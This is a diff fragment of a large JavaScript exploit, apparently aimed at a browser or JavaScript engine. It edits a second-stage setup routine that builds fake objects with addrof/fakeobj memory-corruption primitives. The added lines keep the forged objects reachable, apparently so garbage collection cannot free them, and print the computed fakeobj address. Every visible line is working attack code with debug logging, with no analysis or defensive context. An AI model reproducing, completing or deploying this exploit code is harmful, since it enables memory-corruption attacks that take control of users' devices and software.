@@ -18328,6 +18328,7 @@ const device_chipset = {
           print("setup_stage2: addrof/fakeobj installed");
           let scribble_element;
           let scribbles = [];
+          p.stage2_roots = scribbles;
           let prev_addr = 0n;
           print("setup_stage2: stride search begin");
           for (let i = 0; i < 1000; ++i) {
@@ -18355,13 +18356,17 @@ const device_chipset = {
             p1: fake_sentinel,
             p2: scribble_element
           };
+          scribbles.push(fake_sentinel, change_scribble_holder);
           print("setup_stage2: change_scribble_holder built");
           print("setup_stage2: creating change_scribble");
           print("setup_stage2: addrof change_scribble_holder begin");
           let change_scribble_holder_addr = p.addrof(change_scribble_holder);
           print(`setup_stage2: change_scribble_holder addr=${change_scribble_holder_addr.hex()}`);
+          const change_scribble_addr = change_scribble_holder_addr + 0x10n;
+          print(`setup_stage2: fakeobj change_scribble target=${change_scribble_addr.hex()}`);
           print("setup_stage2: fakeobj change_scribble begin");
-          let change_scribble = p.fakeobj(change_scribble_holder_addr + 0x10n);
+          let change_scribble = p.fakeobj(change_scribble_addr);
+          scribbles.push(change_scribble);
           print("setup_stage2: change_scribble created");
           scribble_element.p3 = 1.1;
           scribble_element[0] = 1.1;
